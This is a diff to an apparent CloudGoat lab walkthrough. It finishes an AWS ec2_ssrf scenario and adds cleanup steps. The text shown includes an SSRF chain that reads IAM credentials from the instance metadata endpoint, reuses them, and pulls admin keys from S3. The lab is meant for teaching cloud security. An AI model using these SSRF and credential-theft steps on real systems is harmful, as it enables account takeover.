@@ -175,6 +175,8 @@ Now that the new instance contains full admin access the targe instance can be t
 9. Remove the scenario with cloudgoat
 `cloudgoat.py destroy iam_privesc_by_attachment --profile goat`
 10. Remove the aws cli credentials for Kerrigan 
+11. Remove the mighty.pem file
+`rm  mighty.pem`
 
 ## cloud_breach_s3
 **Scenario Goal: Download the confidential files from the S3 bucket**
@@ -239,36 +241,36 @@ cat cardholder/card
 **Scenario Goal: Invoke the "cg-lambda-[CG-ID]" Lambda function**
 1. Create scenario  
 `./cloudgoat.py create ec2_ssrf --profile goat`  
-2. Document the output and create a profile for solus
+2. Document the output and create a profile for solus    
 `aws configure --profile solus`    
     * AWS Access Key ID: __solus aws_access_key_id__   
     * AWS Secret Access Key: __solus aws_secret_access_key__   
     * Default region name: __us-east-1__   
     * Default output format: __leave blank__  
-3.  Attempt to list the lamda functions 
+3.  Attempt to list the lamda functions   
 `aws lambda list-functions --profile solus`   
-The listed function contains a service role as well as an ec2 access key id and secret key id
-4. Create a new profile called ec2 with the discovered credentials
+The listed function contains a service role as well as an ec2 access key id and secret key id   
+4. Create a new profile called ec2 with the discovered credentials     
 `aws configure --profile ec2`    
     * AWS Access Key ID: __ec2 aws_access_key_id__   
     * AWS Secret Access Key: __ec2 aws_secret_access_key__   
     * Default region name: __us-east-1__   
     * Default output format: __leave blank__  
-5. Now that we have EC2 permissions, lets describe EC2 instances
+5. Now that we have EC2 permissions, lets describe EC2 instances   
 `aws ec2 describe-instances --profile ec2`
-6. Locate the public IP and navigate to it
-Type error Received, but maybe it's useful
-7. Navigate to the public IP + the URI of one of the listed javascript files
-`http://<publicURL/?url=http://<publicURL>/node_modules/express/lib/router/index.js`
-Result is the portion of a page called "sethsec's SSRF demo"
-8. Attempt to access metadata via the URL SSRF *feature*
-`http://<publicURL/?url=http://169.254.169.254/latest/meta-data`
-9. What a helpful app, attempt discover any security-credentials which may be accessible
-`http://<publicURL/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`
-10. Navigate to the resuting role name
+6. Locate the public IP and navigate to it   
+Type error Received, but maybe it's useful     
+7. Navigate to the public IP + the URI of one of the listed javascript files    
+`http://<publicURL/?url=http://<publicURL>/node_modules/express/lib/router/index.js`   
+Result is the portion of a page called "sethsec's SSRF demo"   
+8. Attempt to access metadata via the URL SSRF *feature*    
+`http://<publicURL/?url=http://169.254.169.254/latest/meta-data`   
+9. What a helpful app, attempt discover any security-credentials which may be accessible    
+`http://<publicURL/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`   
+10. Navigate to the resuting role name     
 `http://<publicURL/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`
-11. Document the new credentials and create a new AWS CLI profile
-`aws configure --profile cg` 
+11. Document the new credentials and create a new AWS CLI profile     
+`aws configure --profile cg`  
     * AWS Access Key ID: __cg-ec2-role aws_access_key_id__   
     * AWS Secret Access Key: __cg-ec2-role aws_secret_access_key__   
     * Default region name: __us-east-1__   
@@ -289,13 +291,31 @@ The cg profile doesn't appear to have permmissions for viewing lambda/ec2/iam re
 `aws s3 cp s3://<cg-secret-s3-bucket-x/admin-user.txt ./`
 17. Read the file    
 `cat admin-user.txt`
-18. Create a new profile with the admin-user credentials
-`aws configure --profile admin`
+18. Create a new profile with the admin-user credentials    
+`aws configure --profile admin`   
     * AWS Access Key ID: __admin-user aws_access_key_id__   
     * AWS Secret Access Key: __admin-user aws_secret_access_key__   
     * Default region name: __us-east-1__   
     * Default output format: __leave blank__ 
-19. 
+Try for the goal again, with the **admin** profile
+19. Attempt to list lambda functions
+`aws lambda list-functions --profile admin`   
+So far so good   
+20. Attempt to execute the lambda function
+`aws lambda invoke --function-name <function-name> --profile admin outfile`
+21. Look for and read the outfile
+```bash
+ls -la 
+cat outfile
+```
+**Goal Achieved**
+
+### Remove c2_ssrf 
+1. Remove the outfile created by executing the lambda function
+`rm outfile`   
+2. Removed the scenario   
+`cloudgoat.py destroy c2_ssrf --profile goat`   
+3. Remove the additional aws profiles: solus, ec2, cg, admin   
 
 ## rce_web_app
 1. Create scenario   
